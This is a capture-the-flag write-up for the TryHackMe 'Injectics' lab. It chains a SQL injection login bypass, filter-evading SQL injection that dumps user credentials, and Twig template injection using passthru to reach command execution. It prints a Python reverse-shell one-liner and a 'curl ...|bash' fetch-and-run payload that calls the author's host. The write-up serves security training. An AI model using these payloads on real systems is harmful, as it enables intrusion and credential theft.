---
title: "TryHackMe: Injectics"
author: jaxafed
categories: [TryHackMe]
tags: [web, javascript, sql injection, ssti, rce]
render_with_liquid: false
media_subpath: /images/tryhackme_injectics/
image:
  path: room_image.webp
---

Injectics started with using an SQL injection to bypass a login form and land on a page where we were able to edit some data. Also, by discovering another SQL injection with edit functionality, we were able to extract some credentials from the database. Using them, we were able to login to the admin panel. There, we discovered a server-side template injection vulnerability that allowed us to execute commands on the machine. Using this, we were able to get a shell, read the second flag, and complete the room.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/injectics){: .center }

## Initial Enumeration

### Nmap Scan

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.126.152
Nmap scan report for 10.10.126.152
Host is up (0.093s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 be:03:b2:6d:7d:22:60:b9:31:36:e7:60:3e:5b:86:f2 (RSA)
|   256 61:2d:6d:13:58:a5:ae:bc:88:50:2b:1f:ba:7b:1d:67 (ECDSA)
|_  256 b0:66:fb:4f:dd:d1:f2:b7:77:9f:55:b0:9d:af:48:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Injectics Leaderboard
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two ports open:

- 22/SSH
- 80/HTTP

### WEB 80

Visiting the `http://10.10.126.152/`, we get a page about `Injectics 2024`.

![Web 80 Index](web_80_index.webp){: width="1200" height="600" }

While many other buttons in the header doesn't work. The `Login` button links to `http://10.10.126.152/login.php`, where we see a login form.

![Web 80 Login](web_80_login.webp){: width="1200" height="600" }

Apart from the login form, it also links to `http://10.10.126.152/adminLogin007.php` with the `Login as Admin` button, where we get another login form. Presumably for admin access.

![Web 80 Admin Login](web_80_admin_login.webp){: width="1200" height="600" }

## Bypassing the Login

Checking the source code for `http://10.10.126.152/login.php`, we see a script being included from `/script.js`.

![Web 80 Login Source](web_80_login_source.webp){: width="1200" height="600" }

Looking at `http://10.10.126.152/script.js`, we see a client-side filter for SQL injection.

```js
$("#login-form").on("submit", function(e) {
    e.preventDefault();
    var username = $("#email").val();
    var password = $("#pwd").val();

	const invalidKeywords = ['or', 'and', 'union', 'select', '"', "'"];
            for (let keyword of invalidKeywords) {
                if (username.includes(keyword)) {
                    alert('Invalid keywords detected');
                   return false;
                }
            }

    $.ajax({
        url: 'functions.php',
        type: 'POST',
        data: {
            username: username,
            password: password,
            function: "login"
        },
        dataType: 'json',
        success: function(data) {
            if (data.status == "success") {
                if (data.auth_type == 0){
                    window.location = 'dashboard.php';
                }else{
                    window.location = 'dashboard.php';
                }
            } else {
                $("#messagess").html('<div class="alert alert-danger" role="alert">' + data.message + '</div>');
            }
        }
    });
});
```
{: file="http://10.10.126.152/script.js" }

Upon submitting the form, if the username includes any of the blacklisted strings, it returns false. Otherwise, it makes a `POST` request to `/functions.php` and, depending on the response, redirects to `/dashboard.php` or displays the message returned.

We can use `BurpSuite` to send the requests directly to bypass it.

Trying to bypass it with the payload `' OR 1=1;-- -`, it fails. So, there might also be a server-side filter.

![Web 80 Login SQLI One](web_80_login_sqli_one.webp){: width="1000" height="400" }

If we try to use `||` instead of `OR` in our payload, we see that works.

![Web 80 Login SQLI Two](web_80_login_sqli_two.webp){: width="1000" height="400" }

After bypassing the login, we gain access to `http://10.10.126.152/dashboard.php`.

![Web 80 Dashboard](web_80_dashboard.webp){: width="1200" height="600" }

## Logging in to The Admin Panel

### Discovering the SQL injection in Edit

Clicking the `Edit` button for any of the countries, we get redirected to `http://10.10.126.152/edit_leaderboard.php?rank=1&country=USA`, where we can edit the medal counts for a country.

![Web 80 Edit Leaderboard Entry](web_80_edit_leaderboard_entry.webp){: width="1200" height="600" }

Editing the gold medal count, we see the `POST` request is made like this:

![Web 80 Edit Leaderboard](web_80_edit_leaderboard.webp){: width="1000" height="400" }

While we are able to edit the medal counts, the country name is not updated.

![Web 80 Leaderboard Update](web_80_leaderboard_update.webp){: width="1200" height="200" }

Changing the rank from `1` to `2`, we see that we updated the second entry.

![Web 80 Edit Leaderboard Two](web_80_edit_leaderboard_two.webp){: width="1000" height="400" }

![Web 80 Leaderboard Update Two](web_80_leaderboard_update_two.webp){: width="1200" height="250" }

This means that if our input is used to update the database, the query is probably something like:

- ``UPDATE <table_name> SET gold=1,silver=21,bronze=12345 WHERE `rank`=1;``

> The reason for `` ` `` around `rank` is due to a conflict with the `rank()` function in `MySQL`. We use `` ` `` to indicate it is a column name. 
{: .prompt-tip }

We can try to confirm this with a payload like this: 
- ``gold=555 WHERE `rank`=3;-- -``

So, the query becomes: 

- ``UPDATE <table_name> SET gold=555 WHERE `rank`=3;-- -``~~``,silver=21,bronze=12345 WHERE `rank`=1;``~~

![Web 80 Edit Leaderboard Three](web_80_edit_leaderboard_three.webp){: width="1000" height="500" }

We can see that this works.

![Web 80 Leaderboard Update Three](web_80_leaderboard_update_three.webp){: width="1200" height="250" }

Now that we have confirmed the SQL injection, we can start looking for ways to extract data.

### Extracting the Credentials

If we try to update any of the medal counts with a string instead of an integer to be able to extract data from the database, we see that it fails.

![Web 80 Edit Leaderboard Four](web_80_edit_leaderboard_four.webp){: width="1000" height="500" }

Instead of the medal counts, we can try to update any other columns that might hold a string like `country`, with a payload like this: 

- `gold=1,country="TEST"`

So, the query to the database becomes: 

- ``UPDATE <table_name> SET gold=1,country="TEST",silver=21,bronze=12345 WHERE `rank`=1;``

![Web 80 Edit Leaderboard Five](web_80_edit_leaderboard_five.webp){: width="1000" height="500" }

We can see that we were able to update the country name with a string. Now, we have a way to extract data from the database.

![Web 80 Leaderboard Update Five](web_80_leaderboard_update_five.webp){: width="1200" height="250" }

Trying to extract the database names with the payload:

- `gold=1,country=(SELECT group_concat(schema_name) from information_schema.schemata)`

We see that this fails with the `Error updating data.` message.

![Web 80 Edit Leaderboard Six](web_80_edit_leaderboard_six.webp){: width="1000" height="500" }

There might be a filter messing with our query. We can test how our query reaches the database by setting it as the country name. For that, we will use the payload:

- `gold=1,country="(SELECT group_concat(schema_name) from information_schema.schemata)"`

![Web 80 Edit Leaderboard Seven](web_80_edit_leaderboard_seven.webp){: width="1000" height="500" }

We can see that the updated country name is:

- `( group_concat(schema_name) from infmation_schema.schemata)`

![Web 80 Leaderboard Update Seven](web_80_leaderboard_update_seven.webp){: width="1200" height="250" }

With this result, we can tell the filter on the server must be replacing some keywords in our input before making the query to the database. Like `SELECT` and `or`.

We can test which words we will use while extracting the database are filtered with a payload like this:

- `gold=1,country="SELECT OR AND group_concat FROM WHERE '"`

![Web 80 Edit Leaderboard Filter](web_80_edit_leaderboard_filter.webp){: width="1000" height="500" }

We end up with: `group_concat FROM WHERE '`. So, `SELECT`,`OR` and `AND` must be filtered.

![Web 80 Leaderboard Update Filter](web_80_leaderboard_update_filter.webp){: width="1200" height="250" }

Looking for ways to bypass the filter, we can test if the replacement is recursive with the payload:

- `gold=1,country="SESELECTLECT"`

![Web 80 Edit Leaderboard Eight](web_80_edit_leaderboard_eight.webp){: width="1000" height="500" }

The country name ends up being `SELECT`. So, the replacement is not recursive; we can use this to bypass the filter.

- `SESELECTLECT` -> `SE[SELECT]LECT` -> `SELECT`

![Web 80 Leaderboard Update Eight](web_80_leaderboard_update_eight.webp){: width="1200" height="250" }

Now that we have a way to bypass the filter, we can modify our query from before to extract the database names like this:

- `gold=1,country=(seSELECTlect group_concat(schema_name) from infoORrmation_schema.schemata)` ->
- `gold=1,country=(se[SELECT]lect group_concat(schema_name) from info[OR]rmation_schema.schemata)` ->
- `gold=1,country=(select group_concat(schema_name) from information_schema.schemata)`

![Web 80 Edit Leaderboard Nine](web_80_edit_leaderboard_nine.webp){: width="1000" height="500" }

We get the database names.

- `mysql,information_schema,performance_schema,sys,phpmyadmin,bac_test`

![Web 80 Leaderboard Update Nine](web_80_leaderboard_update_nine.webp){: width="1200" height="250" }

We can get the table names for the `bac_test` database with the payload:

- `gold=1,country=(seSELECTlect group_concat(table_name) from infoORrmation_schema.tables WHERE table_schema='bac_test')`

![Web 80 Edit Leaderboard Ten](web_80_edit_leaderboard_ten.webp){: width="1000" height="500" }

There are two tables: `leaderboard` and `users`.

![Web 80 Leaderboard Update Ten](web_80_leaderboard_update_ten.webp){: width="1200" height="250" }

Getting the column names for the `bac_test.users` table.

- `gold=1,country=(seSELECTlect group_concat(column_name) from infoORrmation_schema.columns WHERE table_name='users' aANDnd table_schema='bac_test')`

![Web 80 Edit Leaderboard Eleven](web_80_edit_leaderboard_eleven.webp){: width="1000" height="500" }

We get the column names.

- `auth,email,fname,lname,password,reset_token`

![Web 80 Leaderboard Update Eleven](web_80_leaderboard_update_eleven.webp){: width="1200" height="250" }

We can get the `email` and `password` columns from the `users` table with:

- `gold=1,country=(seSELECTlect group_concat(email,':',passwoORrd) from bac_test.users)`

![Web 80 Edit Leaderboard Twelve](web_80_edit_leaderboard_twelve.webp){: width="1000" height="500" }

With this, we get two sets of credentials.

![Web 80 Leaderboard Update Twelve](web_80_leaderboard_update_twelve.webp){: width="1200" height="250" }

Using any of them, we are able to login at `http://10.10.126.152/adminLogin007.php` and get the first flag.

![Web 80 Dashboard Flag](web_80_dashboard_flag.webp){: width="1200" height="500" }

## RCE via SSTI

After logging in, we see the `Profile` button on the header, which links to `http://10.10.126.152/update_profile.php`, where we can update our first and last names

![Web 80 Update Profile](web_80_update_profile.webp){: width="1200" height="600" }

Updating our profile like so:

![Web 80 Update Profile Two](web_80_update_profile_two.webp){: width="1200" height="600" }

Now, visiting `http://10.10.126.152/dashboard.php`, we can see the first name being reflected on the page.

![Web 80 Dashboard Two](web_80_dashboard_two.webp){: width="1200" height="300" }

Trying a simple SSTI payload with the first name like this:

- `{{8*8}}`

![Web 80 Update Profile Three](web_80_update_profile_three.webp){: width="1200" height="600" }

We can see that it works as the first name displayed as `64`.

![Web 80 Dashboard Three](web_80_dashboard_three.webp){: width="1200" height="300" }

Since the application uses `PHP`, there is a great chance it uses the `Twig` templating engine. We can confirm this by using the payload:

- `{{['id']|filter('system')}}`

![Web 80 Update Profile Four](web_80_update_profile_four.webp){: width="1200" height="600" }

The error we receive is specific to `Twig`.

![Web 80 Dashboard Four](web_80_dashboard_four.webp){: width="1200" height="300" }

Looking for other known payloads we can use to execute code in `Twig`, we find `{{['id',""]|sort('system')}}` [here](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#twig-php).

![Web 80 Update Profile Five](web_80_update_profile_five.webp){: width="1000" height="500" }

Updating our first name with the payload and checking the dashboard, we get an error about `system` being disabled.

![Web 80 Dashboard Five](web_80_dashboard_five.webp){: width="1200" height="500" }

Checking other functions, we can use to execute commands like `exec`, `shell_exec`, `passthru`. We see that we are able to execute commands using `passthru` with the payload:

- `{{['id',""]|sort('passthru')}}`

![Web 80 Update Profile Six](web_80_update_profile_six.webp){: width="1000" height="500" }

![Web 80 Dashboard Six](web_80_dashboard_six.webp){: width="1200" height="500" }

We can use this to gain a shell on the machine.

First, we are starting an HTTP server to serve our reverse shell payload.

```console
$ cat index.html
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.72.22",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'                                     

$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Now we can run the command `'curl 10.11.72.22|bash'` using the `{{['curl 10.11.72.22|bash',""]|sort('passthru')}}` payload.

![Web 80 Update Profile Seven](web_80_update_profile_seven.webp){: width="1000" height="500" }

After visiting the `http://10.10.126.152/dashboard.php` page, we see the machine fetching the script from our HTTP server, and we get a shell on our listener.

```console
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.126.152 - - [29/Jul/2024 02:29:24] "GET / HTTP/1.1" 200 -
```

```console
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.11.72.22] from (UNKNOWN) [10.10.126.152] 54032
$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Checking the `/var/www/html` directory, we find the `flags` directory.

```console
www-data@injectics:/var/www/html$ ls -la
...
drwxrwxr-x 2 ubuntu ubuntu   4096 Jul 18 14:58 flags
...
```

Inside the `/var/www/html/flags/` directory, we find a text file with the flag inside, and by reading it, we are able to complete the room.

```console
www-data@injectics:/var/www/html$ cd flags
www-data@injectics:/var/www/html/flags$ ls -la 5d[REDACTED]48.txt
-rw-rw-r-- 1 ubuntu ubuntu 38 Jul 18 14:58 5d[REDACTED]48.txt
www-data@injectics:/var/www/html/flags$ wc -c 5d[REDACTED]48.txt
38 5d[REDACTED]48.txt
```


<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}

</style>